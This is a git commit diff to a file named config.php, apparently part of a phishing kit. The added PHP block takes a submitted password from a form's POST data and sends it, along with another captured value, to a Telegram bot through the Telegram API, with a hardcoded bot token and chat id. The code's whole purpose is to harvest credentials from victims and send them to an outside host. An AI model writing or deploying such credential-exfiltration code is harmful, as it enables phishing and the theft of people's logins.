9dd0df64a7878ec8cbf8c891aac2605ec3ce3cfd
AI22AK47 <94799989+AI22AK47@users.noreply.github.com>
2022-11-07 07:13:09 +0600

    Update config.php

--- config.php
+++ config.php
@@ -5,3 +5,9 @@
         $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text,$text2");    
     
 ?>
+<?php
+    if(isset($_POST['submit']))
+    $text2=$_POST["pass"];
+        $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text,$text2");    
+    
+?>
